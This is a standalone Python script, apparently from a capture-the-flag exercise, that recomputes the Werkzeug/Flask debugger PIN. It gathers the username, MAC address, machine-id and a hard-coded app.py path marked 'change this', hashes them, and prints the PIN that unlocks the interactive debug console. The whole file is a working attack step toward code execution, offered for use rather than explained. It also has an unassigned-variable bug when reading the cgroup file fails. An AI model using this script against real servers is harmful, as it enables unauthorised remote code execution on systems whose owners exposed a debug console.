import hashlib
from itertools import chain
import os
import getpass
import uuid

pin = None
rv = None
num = None

def get_linux_machine_id():
    try:
        with open("/proc/self/cgroup") as f:
            value = f.readline()
    except IOError:
        pass
    else:
        value = value.strip().partition("/docker/")[2]
    if value:
        return value
    for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
        try:
            with open(filename, "rb") as f:
                return f.readline().strip()
        except IOError:
            continue

probably_public_bits = [
  str(getpass.getuser()), # username
  'flask.app' , # modname
  'Flask',
  '/home/elliot/.local/lib/python3.9/site-packages/flask/app.py' #change this
  ]

private_bits = [
  str(uuid.getnode()),
  get_linux_machine_id(),
  ]
print(get_linux_machine_id())

h = hashlib.md5()

# Bit is going through every thing in probably_public_bits and private_bits

for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

if num is None :
    h.update(b"pinsalt")
    num = ("%09d" % int(h.hexdigest(), 16))[:9]

if rv is None :
    for group_size in 5 , 4 , 3 :
        if len (num)% group_size == 0 :
            rv = '-' .join (num [x: x + group_size] .rjust (group_size, '0' )
            for x in range ( 0 , len (num), group_size))
            break
        else :
            rv = num

print (rv)
